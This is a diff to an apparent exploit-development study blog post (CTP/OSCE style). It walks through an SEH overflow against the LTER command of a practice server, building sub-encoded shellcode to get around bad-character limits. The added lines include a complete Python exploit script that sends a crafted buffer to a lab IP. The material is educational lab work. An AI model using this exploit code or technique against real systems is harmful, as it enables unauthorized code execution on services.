@@ -251,7 +251,23 @@ nasm > call ebx
 00000000  FFD3              call ebx
 ```
 
-Looks like our code will be: `\x50\x5b\xff\xd3`. We know `\x50` and `\x5b` are fine to use so we can place those in our exploit code already. To encode `\xff\xd3` I used an awesome tool called [Z3ncoder](https://github.com/marcosValle/z3ncoder) which does sub encoding. 
+Looks like our code will be: `\x50\x5b\xff\xd3`. We know `\x50` and `\x5b` are fine to use so we can place those in our exploit code already. We'll call this variable `switch`.
+
+If you remember how the encoding process works, we need `EAX` to be set equal to our opcode instructions and then pushed onto the stack to get decoded. How do we get our current `EAX` register to equal `\xff\xd3`? First we need to zero the register out. In the previous post we learned that the following two `AND` instructions will zero `EAX` out every time:
++ and eax,0x554e4d4a; 
++ and eax,0x2a313235
+
+Getting the opcodes:
+```terminal_session
+nasm > and eax,0x554e4d4a
+00000000  254A4D4E55        and eax,0x554e4d4a
+nasm > and eax,0x2a313235
+00000000  253532312A        and eax,0x2a313235
+```
+
+So our zeroing out code is going to be: `\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A`. We can add this value to a variable called `zeroOut`.
+
+Now all that's left is to encode `\xff\xd3`. I used an awesome tool called [Z3ncoder](https://github.com/marcosValle/z3ncoder) which does sub encoding. 
 
 Installation spelled out in the readme:
 `git clone https://github.com/marcosValle/z3ncoder`
@@ -261,14 +277,77 @@ Installation spelled out in the readme:
 
 There was some python vs. python3 package confusion after this so I just did `pip install z3-solver` and used python 2.7.
 
-If you remember how the encoding process works, we need `EAX` to be set equal to our opcode instructions and then pushed onto the stack to get decoded. How do we get our current `EAX` register to equal `\xff\xd3`? We need to remember that the code is read in the debugger display from right to left and we also have to pad our two bytes with two bytes of NOPs since we have to have a multiple of four. Luckily we spent 16 hours yesterday figuring out how this works! :) 
+We need to remember that the code is read in the debugger display from right to left and we also have to pad our two bytes with two bytes of NOPs since we have to have a multiple of four. Luckily we spent 16 hours yesterday figuring out how this works! :) 
 
 So given the reverse order requirement, and the 4 byte requirement, we need to encode `9090D3FF`. 
 
 Let's use Z3ncoder. 
 ![](/assets/images/CTP/zen.gif)
 
+So our encoded shellcode will be: `\x2D\x2D\x3E\x7A\x21\x2D\x58\x6E\x7A\x2B\x2D\x7C\x7F\x7A\x22`. This will put the value `9090D3FF` into `EAX` once it's decoded. We'll call this variable `subEncode`. 
 
+The last opcode we need to add is `push eax` which will actually decode the shellcode by placing the value held by `EAX` 'ontop' of our adjusted `ESP`. That opcode is simply `\x50`. We'll call this variable `pushEax`.
+
+Our exploit code now looks like this: 
+```python
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+nSeh = '\x74\x06\x75\x04'
+
+Seh = '\x2b\x17\x50\x62'
+
+espAdj = '\x54\x58\x66\x05\x5b\x13\x50\x5c'
+#push esp
+#pop eax
+#add ax, 0x135b
+#push eax
+#pop esp
+
+eaxAdj = '\x66\x2d\x7a\x01\x66\x2d\x7b\x0c'
+#sub ax, 0x017a
+#sub ax, 0x0c7b
+#points EAX towards beginning of our A buffer which is 0xdf5 away
+
+switch = '\x50\x5b' # puts EAX into EBX, EBX now points to beginning of A buffer. We need to jump there. 
+
+zeroOut = '\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A' #and eax,0x554e4d4a; and eax,0x2a313235
+
+subEncode= '\x2D\x2D\x3E\x7A\x21\x2D\x58\x6E\x7A\x2B\x2D\x7C\x7F\x7A\x22'
+#sub eax, 0x217a3e2d
+#sub eax, 0x2b7a6e58
+#sub eax, 0x227a7f7c
+
+pushEax = '\x50'
+
+buffer = 'A' * 3514 
+buffer += nSeh
+buffer += Seh
+buffer += espAdj
+buffer += eaxAdj
+buffer += switch
+buffer += zeroOut
+buffer += subEncode
+buffer += pushEax
+buffer += 'D' * (4000 - len(buffer))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("LTER /.../" + buffer)
+print s.recv(1024)
+s.close()
+```
+
+If this works correctly, a red jump instruction to `EBX` at the top of our `A` buffer should pop onto our stack and we should pass control to it and jump. 
+
+**BEFORE DECODING**
 
 
 
